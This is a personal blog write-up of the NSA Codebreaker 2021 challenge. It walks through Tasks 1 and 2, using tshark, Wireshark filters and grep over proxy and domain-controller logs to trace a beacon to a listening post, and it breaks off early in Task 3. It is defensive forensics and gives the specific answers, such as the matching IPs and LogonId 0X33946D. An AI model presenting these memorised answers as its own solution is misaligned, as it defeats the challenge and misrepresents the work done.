<!doctype html><html lang=en-us data-theme>
<head>
<meta charset=utf-8>
<meta name=HandheldFriendly content="True">
<meta name=viewport content="width=device-width,initial-scale=1">
<meta name=referrer content="no-referrer-when-downgrade">
<title>NSA Codebreakers 2021 - Emily's Personal Website!</title>
<meta name=description content="NSA Codebreaker Writeups">
<link rel=icon type=image/x-icon href=https://murphe22.com/favicon.ico>
<link rel=apple-touch-icon-precomposed href=https://murphe22.com/favicon.png>
<link rel=stylesheet href=https://murphe22.com/css/style.min.9a5aaab18cf72e04b271c3974ff2d090e83d694022c39e89cb5de41ead7d0fea.css integrity="sha256-mlqqsYz3LgSyccOXT/LQkOg9aUAiw56Jy13kHq19D+o=">
<script src=https://murphe22.com/js/script.min.510c781c39dbb21b4c76d85c82e2bdf4689220adbb7cd61e49e9d293e442fb42.js type=text/javascript integrity="sha256-UQx4HDnbshtMdthcguK99GiSIK27fNYeSenSk+RC+0I="></script>
<meta property="og:title" content="NSA Codebreakers 2021">
<meta property="og:description" content="NSA Codebreaker Writeups">
<meta property="og:type" content="article">
<meta property="og:url" content="https://murphe22.com/posts/nsacodebreaker/"><meta property="article:section" content="posts">
<meta property="article:published_time" content="2022-01-04T00:00:00+00:00">
<meta property="article:modified_time" content="2022-01-04T00:00:00+00:00">
<meta name=twitter:card content="summary">
<meta name=twitter:title content="NSA Codebreakers 2021">
<meta name=twitter:description content="NSA Codebreaker Writeups">
</head>
<body>
<a class=skip-main href=#main>Skip to main content</a>
<div class=container>
<header class=common-header>
<div class=header-top>
<h1 class=site-title>
<a href=/>Emily's Personal Website!</a>
</h1>
<ul class=social-icons>
<li>
<a href=https://www.linkedin.com/in/murphe22/ title=Linkedin rel=me>
<span class=inline-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentcolor" d="M416 32H31.9C14.3 32 0 46.5.0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6.0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3.0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2.0 38.5 17.3 38.5 38.5.0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6.0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2.0 79.7 44.3 79.7 101.9V416z"/></svg>
</span>
</a>
</li>
<li>
<a href=https://github.com/emurph1 title=Github rel=me>
<span class=inline-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentcolor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6.0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6.0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3.0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1.0-6.2-.3-40.4-.3-61.4.0.0-70 15-84.7-29.8.0.0-11.4-29.1-27.8-36.6.0.0-22.9-15.7 1.6-15.4.0.0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5.0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9.0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4.0 33.7-.3 75.4-.3 83.6.0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6.0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9.0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
</span>
</a>
</li>
<li>
<a href=https://github.com/emurph1 title=Twitter rel=me>
<span class=inline-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M459.37 151.716c.325 4.548.325 9.097.325 13.645.0 138.72-105.583 298.558-298.558 298.558-59.452.0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055.0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421.0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391.0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04.0-57.828 46.782-104.934 104.934-104.934 30.213.0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg>
</span>
</a>
</li>
</ul>
</div>
<nav>
<a href=https://murphe22.com/about/ title>About</a>
<a href=https://murphe22.com/posts/ title>Writeups</a>
<a href=https://murphe22.com/contact/ title>Contact</a>
<a href=https://murphe22.com/tags/ title>Tags</a>
</nav>
</header>
<main id=main tabindex=-1>
<article class="post h-entry">
<div class=post-header>
<header>
<h1 class="p-name post-title favorite">NSA Codebreakers 2021</h1>
</header>
</div>
<div class="content e-content">
<p>The 2021 Codebreaker Challenge consists of a series of tasks that are worth a varying amount of points based upon their difficulty. Schools will be ranked according to the total number of points accumulated by their students. Solutions may be submitted at any time for the duration of the Challenge.</p>
<h1 id=intro>Intro
<span>
<a href=#intro><svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
</a>
</span>
</h1><p>NSA Codebreakers was quite a competition, but it was so fun. We had never been very involved with it until this year. Jonathan, Teddy, and I spearheaded recruitment for Codebreakers and we ended up getting almost 400 people from A&M to sign-up! As a university, we ended up in <code>4th place</code>. For myself, participating in NSA Codebreakers was a great time and I learned a ton when going through the challenges.</p>
<h1 id=task-1>Task 1
<span>
<a href=#task-1><svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
</a>
</span>
</h1><p>The NSA Cybersecurity Collaboration Center has a mission to prevent and eradicate threats to the US Defense Industrial Base (DIB). Based on information sharing agreements with several DIB companies, we need to determine if any of those companies are communicating with the actor&rsquo;s infrastructure.</p>
<p>You have been provided a capture of data en route to the listening post as well as a list of DIB company IP ranges. Identify any IPs associated with the DIB that have communicated with the LP.</p>
<p>Downloads:</p>
<ul>
<li>Network traffic heading to the LP (capture.pcap)</li>
<li>DIB IP address ranges (ip_ranges.txt)</li>
</ul>
<h2 id=solution>Solution
<span>
<a href=#solution><svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
</a>
</span>
</h2><ol>
<li>
<p>taking the ip_ranges.txt, use tshark to extract the unique ip addresses</p>
<p><code>tshark -r capture.pcap -T fields -e ip.src | sort | uniq > output.csv</code></p>
<p>b. make sure to get rid of the malicious LP (10.120.14.143)</p>
</li>
<li>
<p>from there, make a script that will go through each of the ips and using ipaddress library and csv library, check to see if any of the ip subnets noted in the ip_ranges.txt</p>
</li>
<li>
<p>output of the file</p>
<pre tabindex=0><code>192.168.19.21
198.18.79.146
198.19.39.130
198.19.206.53
</code></pre></li>
</ol>
<h2 id=alternate-way-to-solve>Alternate way to solve
<span>
<a href=#alternate-way-to-solve><svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
</a>
</span>
</h2><ol>
<li>
<p>go into vim -> visual block mode to add the filter</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>ip<span style=color:#ff79c6>.</span>src<span style=color:#ff79c6>==</span><span style=color:#bd93f9>198.18.152.0</span><span style=color:#ff79c6>/</span><span style=color:#bd93f9>23</span>
<span style=color:#ff79c6>||</span> ip<span style=color:#ff79c6>.</span>src<span style=color:#ff79c6>==</span><span style=color:#bd93f9>10.226.176.0</span><span style=color:#ff79c6>/</span><span style=color:#bd93f9>21</span>
<span style=color:#ff79c6>||</span> ip<span style=color:#ff79c6>.</span>src<span style=color:#ff79c6>==</span><span style=color:#bd93f9>192.168.20.128</span><span style=color:#ff79c6>/</span><span style=color:#bd93f9>25</span>
<span style=color:#ff79c6>||</span> ip<span style=color:#ff79c6>.</span>src<span style=color:#ff79c6>==</span><span style=color:#bd93f9>10.36.0.0</span><span style=color:#ff79c6>/</span><span style=color:#bd93f9>18</span>
<span style=color:#ff79c6>||</span> ip<span style=color:#ff79c6>.</span>src<span style=color:#ff79c6>==</span><span style=color:#bd93f9>10.147.88.0</span><span style=color:#ff79c6>/</span><span style=color:#bd93f9>22</span>
<span style=color:#ff79c6>||</span> ip<span style=color:#ff79c6>.</span>src<span style=color:#ff79c6>==</span><span style=color:#bd93f9>192.168.19.0</span><span style=color:#ff79c6>/</span><span style=color:#bd93f9>27</span>
<span style=color:#ff79c6>||</span> ip<span style=color:#ff79c6>.</span>src<span style=color:#ff79c6>==</span><span style=color:#bd93f9>198.19.122.144</span><span style=color:#ff79c6>/</span><span style=color:#bd93f9>28</span>
<span style=color:#ff79c6>||</span> ip<span style=color:#ff79c6>.</span>src<span style=color:#ff79c6>==</span><span style=color:#bd93f9>198.18.23.160</span><span style=color:#ff79c6>/</span><span style=color:#bd93f9>29</span>
<span style=color:#ff79c6>||</span> ip<span style=color:#ff79c6>.</span>src<span style=color:#ff79c6>==</span><span style=color:#bd93f9>10.198.78.0</span><span style=color:#ff79c6>/</span><span style=color:#bd93f9>26</span>
<span style=color:#ff79c6>||</span> ip<span style=color:#ff79c6>.</span>src<span style=color:#ff79c6>==</span><span style=color:#bd93f9>10.147.176.0</span><span style=color:#ff79c6>/</span><span style=color:#bd93f9>22</span>
<span style=color:#ff79c6>||</span> ip<span style=color:#ff79c6>.</span>src<span style=color:#ff79c6>==</span><span style=color:#bd93f9>10.244.177.128</span><span style=color:#ff79c6>/</span><span style=color:#bd93f9>26</span>
<span style=color:#ff79c6>||</span> ip<span style=color:#ff79c6>.</span>src<span style=color:#ff79c6>==</span><span style=color:#bd93f9>10.44.192.0</span><span style=color:#ff79c6>/</span><span style=color:#bd93f9>20</span>
<span style=color:#ff79c6>||</span> ip<span style=color:#ff79c6>.</span>src<span style=color:#ff79c6>==</span><span style=color:#bd93f9>10.28.176.0</span><span style=color:#ff79c6>/</span><span style=color:#bd93f9>20</span>
<span style=color:#ff79c6>||</span> ip<span style=color:#ff79c6>.</span>src<span style=color:#ff79c6>==</span><span style=color:#bd93f9>10.0.0.0</span><span style=color:#ff79c6>/</span><span style=color:#bd93f9>18</span>
<span style=color:#ff79c6>||</span> ip<span style=color:#ff79c6>.</span>src<span style=color:#ff79c6>==</span><span style=color:#bd93f9>198.19.39.128</span><span style=color:#ff79c6>/</span><span style=color:#bd93f9>25</span>
<span style=color:#ff79c6>||</span> ip<span style=color:#ff79c6>.</span>src<span style=color:#ff79c6>==</span><span style=color:#bd93f9>198.18.79.144</span><span style=color:#ff79c6>/</span><span style=color:#bd93f9>28</span>
<span style=color:#ff79c6>||</span> ip<span style=color:#ff79c6>.</span>src<span style=color:#ff79c6>==</span><span style=color:#bd93f9>10.57.162.0</span><span style=color:#ff79c6>/</span><span style=color:#bd93f9>24</span>
<span style=color:#ff79c6>||</span> ip<span style=color:#ff79c6>.</span>src<span style=color:#ff79c6>==</span><span style=color:#bd93f9>198.19.246.160</span><span style=color:#ff79c6>/</span><span style=color:#bd93f9>27</span>
<span style=color:#ff79c6>||</span> ip<span style=color:#ff79c6>.</span>src<span style=color:#ff79c6>==</span><span style=color:#bd93f9>192.168.131.0</span><span style=color:#ff79c6>/</span><span style=color:#bd93f9>28</span>
<span style=color:#ff79c6>||</span> ip<span style=color:#ff79c6>.</span>src<span style=color:#ff79c6>==</span><span style=color:#bd93f9>10.201.15.0</span><span style=color:#ff79c6>/</span><span style=color:#bd93f9>24</span>
<span style=color:#ff79c6>||</span> ip<span style=color:#ff79c6>.</span>src<span style=color:#ff79c6>==</span><span style=color:#bd93f9>198.18.92.136</span><span style=color:#ff79c6>/</span><span style=color:#bd93f9>29</span>
<span style=color:#ff79c6>||</span> ip<span style=color:#ff79c6>.</span>src<span style=color:#ff79c6>==</span><span style=color:#bd93f9>198.19.206.0</span><span style=color:#ff79c6>/</span><span style=color:#bd93f9>25</span>
<span style=color:#ff79c6>||</span> ip<span style=color:#ff79c6>.</span>src<span style=color:#ff79c6>==</span><span style=color:#bd93f9>10.254.178.104</span><span style=color:#ff79c6>/</span><span style=color:#bd93f9>29</span>
<span style=color:#ff79c6>||</span> ip<span style=color:#ff79c6>.</span>src<span style=color:#ff79c6>==</span><span style=color:#bd93f9>10.47.0.0</span><span style=color:#ff79c6>/</span><span style=color:#bd93f9>16</span>
<span style=color:#ff79c6>||</span> ip<span style=color:#ff79c6>.</span>src<span style=color:#ff79c6>==</span><span style=color:#bd93f9>10.233.93.0</span><span style=color:#ff79c6>/</span><span style=color:#bd93f9>24</span>
<span style=color:#ff79c6>||</span> ip<span style=color:#ff79c6>.</span>src<span style=color:#ff79c6>==</span><span style=color:#bd93f9>10.246.32.0</span><span style=color:#ff79c6>/</span><span style=color:#bd93f9>19</span>
!(ip<span style=color:#ff79c6>.</span>src<span style=color:#ff79c6>==</span><span style=color:#bd93f9>10.120.14.143</span>)
</code></pre></div></li>
<li>
<p>Go into wireshark and paste that input in the filter field</p>
</li>
<li>
<p>go into statistics (from the menu bar) -> endpoints -> check the &ldquo;limit to display filter&rdquo; -> go to IPv4 tab -> IPs are there!</p>
</li>
</ol>
<h1 id=task-2>Task 2
<span>
<a href=#task-2><svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
</a>
</span>
</h1><p>NSA notified FBI, which notified the potentially-compromised DIB Companies. The companies reported the compromise to the Defense Cyber Crime Center (DC3). One of them, Online Operations and Production Services (OOPS) requested FBI assistance. At the request of the FBI, we&rsquo;ve agreed to partner with them in order to continue the investigation and understand the compromise.</p>
<p>OOPS is a cloud containerization provider that acts as a one-stop shop for hosting and launching all sorts of containers &ndash; rkt, Docker, Hyper-V, and more. They have provided us with logs from their network proxy and domain controller that coincide with the time that their traffic to the cyber actor&rsquo;s listening post was captured.</p>
<p>Identify the logon ID of the user session that communicated with the malicious LP (i.e.: on the machine that sent the beacon <em>and</em> active at the time the beacon was sent).</p>
<p>Downloads:</p>
<ul>
<li>Subnet associated with OOPS (oops_subnet.txt)</li>
<li>Network proxy logs from Bluecoat server (proxy.log)</li>
<li>Login data from domain controller (logins.json)</li>
</ul>
<h2 id=solution-1>Solution
<span>
<a href=#solution-1><svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
</a>
</span>
</h2><ol>
<li>
<p>Using the ip from the previous task and under the subnet defined in the oops_subnet.txt, run a grep to look within the proxy.log (where the ip is the listening post)</p>
<p><code>grep 10.120.14.143 proxy.log</code></p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#bd93f9>2021</span><span style=color:#ff79c6>-</span><span style=color:#bd93f9>03</span><span style=color:#ff79c6>-</span><span style=color:#bd93f9>16</span> <span style=color:#bd93f9>08</span>:<span style=color:#bd93f9>34</span>:<span style=color:#bd93f9>49</span> <span style=color:#bd93f9>40</span> <span style=color:#bd93f9>10.210.95.77</span> <span style=color:#bd93f9>200</span> TCP_MISS <span style=color:#bd93f9>12734</span> <span style=color:#bd93f9>479</span> GET http xomtq<span style=color:#ff79c6>.</span>invalid analysis <span style=color:#ff79c6>-</span> <span style=color:#ff79c6>-</span> DIRECT <span style=color:#ff79c6>**</span><span style=color:#bd93f9>10.120.14.143</span><span style=color:#ff79c6>**</span> application<span style=color:#ff79c6>/</span>octet<span style=color:#ff79c6>-</span>stream <span style=color:#f1fa8c>&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36&#39;</span> PROXIED none <span style=color:#ff79c6>-</span> <span style=color:#bd93f9>10.210.94.189</span> SG<span style=color:#ff79c6>-</span>HTTP<span style=color:#ff79c6>-</span>Service <span style=color:#ff79c6>-</span> none <span style=color:#ff79c6>-</span>
</code></pre></div></li>
<li>
<p>Clean up the logins.json</p>
<p><code>grep "logon\|log off" logins.json</code></p>
</li>
<li>
<p>Create a Python script to parse through the JSON data to find the logons and log offs and see which LogonIds are associated with the time found from step 1</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#bd93f9>0X339534</span>
<span style=color:#bd93f9>0X339757</span>
<span style=color:#bd93f9>0X33946D</span>
<span style=color:#bd93f9>0X339870</span>
<span style=color:#bd93f9>0X339989</span>
<span style=color:#bd93f9>0X339A8A</span> 
</code></pre></div></li>
<li>
<p>use a grep to in the json to find the specific LogonId with the IP from step 1</p>
<p>a. &ldquo;-E&rdquo; means extended using a regex expression
i. you could do it without regex which is the grep query below (where the &ldquo;" before the pipe notes that it is a OR operation)</p>
<p><code>grep -E "0X339534|0X339757|0X33946D|0X339870|0X339989|0X339A8A" narrowed.json | grep "10.210.95.77"</code></p>
<p><code>grep "0X339534\|0X339757\|0X33946D\|0X339870\|0X339989\|0X339A8A" narrowed.json | grep "10.210.95.77"</code></p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript>{<span style=color:#f1fa8c>&#34;PayloadData1&#34;</span><span style=color:#ff79c6>:</span> <span style=color:#f1fa8c>&#34;Target: OOPS.NET\\chambers.jennifer&#34;</span>, <span style=color:#f1fa8c>&#34;PayloadData2&#34;</span><span style=color:#ff79c6>:</span> <span style=color:#f1fa8c>&#34;LogonType 3&#34;</span>, <span style=color:#f1fa8c>&#34;PayloadData3&#34;</span><span style=color:#ff79c6>:</span> <span style=color:#f1fa8c>&#34;LogonId: 0X33946D&#34;</span>, <span style=color:#f1fa8c>&#34;UserName&#34;</span><span style=color:#ff79c6>:</span> <span style=color:#f1fa8c>&#34;-\\-&#34;</span>, <span style=color:#f1fa8c>&#34;RemoteHost&#34;</span><span style=color:#ff79c6>:</span> <span style=color:#f1fa8c>&#34;- (10.210.95.77)&#34;</span>, <span style=color:#f1fa8c>&#34;ExecutableInfo&#34;</span><span style=color:#ff79c6>:</span> <span style=color:#f1fa8c>&#34;-&#34;</span>, <span style=color:#f1fa8c>&#34;MapDescription&#34;</span><span style=color:#ff79c6>:</span> <span style=color:#f1fa8c>&#34;Successful logon&#34;</span>, <span style=color:#f1fa8c>&#34;ChunkNumber&#34;</span><span style=color:#ff79c6>:</span> <span style=color:#bd93f9>0</span>, <span style=color:#f1fa8c>&#34;Computer&#34;</span><span style=color:#ff79c6>:</span> <span style=color:#f1fa8c>&#34;OOPS-DC.oops.net&#34;</span>, <span style=color:#f1fa8c>&#34;Payload&#34;</span><span style=color:#ff79c6>:</span> <span style=color:#f1fa8c>&#34;{\&#34;EventData\&#34;: {\&#34;Data\&#34;: [{\&#34;@Name\&#34;: \&#34;SubjectUserSid\&#34;, \&#34;#text\&#34;: \&#34;S-1-0-0\&#34;}, {\&#34;@Name\&#34;: \&#34;SubjectUserName\&#34;, \&#34;#text\&#34;: \&#34;-\&#34;}, {\&#34;@Name\&#34;: \&#34;SubjectDomainName\&#34;, \&#34;#text\&#34;: \&#34;-\&#34;}, {\&#34;@Name\&#34;: \&#34;SubjectLogonId\&#34;, \&#34;#text\&#34;: \&#34;0x0\&#34;}, {\&#34;@Name\&#34;: \&#34;TargetUserSid\&#34;, \&#34;#text\&#34;: \&#34;S-1-5-21-3521346-774097835-5683131894-1126\&#34;}, {\&#34;@Name\&#34;: \&#34;TargetUserName\&#34;, \&#34;#text\&#34;: \&#34;chambers.jennifer\&#34;}, {\&#34;@Name\&#34;: \&#34;TargetDomainName\&#34;, \&#34;#text\&#34;: \&#34;OOPS.NET\&#34;}, {\&#34;@Name\&#34;: \&#34;TargetLogonId\&#34;, \&#34;#text\&#34;: \&#34;0X33946D\&#34;}, {\&#34;@Name\&#34;: \&#34;LogonType\&#34;, \&#34;#text\&#34;: \&#34;3\&#34;}, {\&#34;@Name\&#34;: \&#34;LogonProcessName\&#34;, \&#34;#text\&#34;: \&#34;Kerberos\&#34;}, {\&#34;@Name\&#34;: \&#34;AuthenticationPackageName\&#34;, \&#34;#text\&#34;: \&#34;Kerberos\&#34;}, {\&#34;@Name\&#34;: \&#34;WorkstationName\&#34;, \&#34;#text\&#34;: \&#34;-\&#34;}, {\&#34;@Name\&#34;: \&#34;LogonGuid\&#34;, \&#34;#text\&#34;: \&#34;c5dfa92b-9ee6-4b7b-9029-207959f780e7\&#34;}, {\&#34;@Name\&#34;: \&#34;TransmittedServices\&#34;, \&#34;#text\&#34;: \&#34;-\&#34;}, {\&#34;@Name\&#34;: \&#34;LmPackageName\&#34;, \&#34;#text\&#34;: \&#34;-\&#34;}, {\&#34;@Name\&#34;: \&#34;KeyLength\&#34;, \&#34;#text\&#34;: \&#34;0\&#34;}, {\&#34;@Name\&#34;: \&#34;ProcessId\&#34;, \&#34;#text\&#34;: \&#34;0x0\&#34;}, {\&#34;@Name\&#34;: \&#34;ProcessName\&#34;, \&#34;#text\&#34;: \&#34;-\&#34;}, {\&#34;@Name\&#34;: \&#34;IpAddress\&#34;, \&#34;#text\&#34;: \&#34;10.210.95.77\&#34;}, {\&#34;@Name\&#34;: \&#34;IpPort\&#34;, \&#34;#text\&#34;: \&#34;39845\&#34;}, {\&#34;@Name\&#34;: \&#34;ImpersonationLevel\&#34;, \&#34;#text\&#34;: \&#34;%%1833\&#34;}, {\&#34;@Name\&#34;: \&#34;RestrictedAdminMode\&#34;, \&#34;#text\&#34;: \&#34;-\&#34;}, {\&#34;@Name\&#34;: \&#34;TargetOutboundUserName\&#34;, \&#34;#text\&#34;: \&#34;-\&#34;}, {\&#34;@Name\&#34;: \&#34;TargetOutboundDomainName\&#34;, \&#34;#text\&#34;: \&#34;-\&#34;}, {\&#34;@Name\&#34;: \&#34;VirtualAccount\&#34;, \&#34;#text\&#34;: \&#34;%%1843\&#34;}, {\&#34;@Name\&#34;: \&#34;TargetLinkedLogonId\&#34;, \&#34;#text\&#34;: \&#34;0x0\&#34;}, {\&#34;@Name\&#34;: \&#34;ElevatedToken\&#34;, \&#34;#text\&#34;: \&#34;%%1842\&#34;}]}}&#34;</span>, <span style=color:#f1fa8c>&#34;Channel&#34;</span><span style=color:#ff79c6>:</span> <span style=color:#f1fa8c>&#34;Security&#34;</span>, <span style=color:#f1fa8c>&#34;Provider&#34;</span><span style=color:#ff79c6>:</span> <span style=color:#f1fa8c>&#34;Microsoft-Windows-Security-Auditing&#34;</span>, <span style=color:#f1fa8c>&#34;EventId&#34;</span><span style=color:#ff79c6>:</span> <span style=color:#bd93f9>4624</span>, <span style=color:#f1fa8c>&#34;EventRecordId&#34;</span><span style=color:#ff79c6>:</span> <span style=color:#f1fa8c>&#34;5378&#34;</span>, <span style=color:#f1fa8c>&#34;ProcessId&#34;</span><span style=color:#ff79c6>:</span> <span style=color:#bd93f9>693</span>, <span style=color:#f1fa8c>&#34;ThreadId&#34;</span><span style=color:#ff79c6>:</span> <span style=color:#bd93f9>5958</span>, <span style=color:#f1fa8c>&#34;Level&#34;</span><span style=color:#ff79c6>:</span> <span style=color:#f1fa8c>&#34;LogAlways&#34;</span>, <span style=color:#f1fa8c>&#34;Keywords&#34;</span><span style=color:#ff79c6>:</span> <span style=color:#f1fa8c>&#34;Audit success&#34;</span>, <span style=color:#f1fa8c>&#34;SourceFile&#34;</span><span style=color:#ff79c6>:</span> <span style=color:#f1fa8c>&#34;C:\\Windows\\system32\\winevt\\Logs\\Security.evtx&#34;</span>, <span style=color:#f1fa8c>&#34;ExtraDataOffset&#34;</span><span style=color:#ff79c6>:</span> <span style=color:#bd93f9>0</span>, <span style=color:#f1fa8c>&#34;HiddenRecord&#34;</span><span style=color:#ff79c6>:</span> <span style=color:#ff79c6>false</span>, <span style=color:#f1fa8c>&#34;TimeCreated&#34;</span><span style=color:#ff79c6>:</span> <span style=color:#f1fa8c>&#34;2021-03-16T12:09:22.6771601+00:00&#34;</span>, <span style=color:#f1fa8c>&#34;RecordNumber&#34;</span><span style=color:#ff79c6>:</span> <span style=color:#f1fa8c>&#34;5378&#34;</span>}

</code></pre></div></li>
<li>
<p><strong>LogonId: 0X33946D</strong></p>
</li>
</ol>
<h1 id=task-3>Task 3
<span>
<a href=#task-3><svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
</a>
</span>
</h1><p>With the provided information, OOPS was quickly able to identify the employee associated with the account. During the incident response interview, the user mentioned that they would have been checking email around the time that the communication occurred. They don&rsquo;t remember anything particularly weird from earlier, but it was a few weeks back, so they&rsquo;re not sure. OOPS has provided a subset of the user&rsquo;s inbox from the day of the communication.</p>
<p>Identify the message ID of the malicious email and the targeted server.</p>
<p>Downloads:</p>
<ul>
<li>User&rsquo;s emails (emails.zip)</li>
</ul>
<h1 id=solution-2>Solution
<span>
<a href=#solution-2><svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
</a>
</span>
</h1><ol>
<li>
<p>unzip emails</p>
</li>
<li>
<p>use ripmime to extract all the attachments
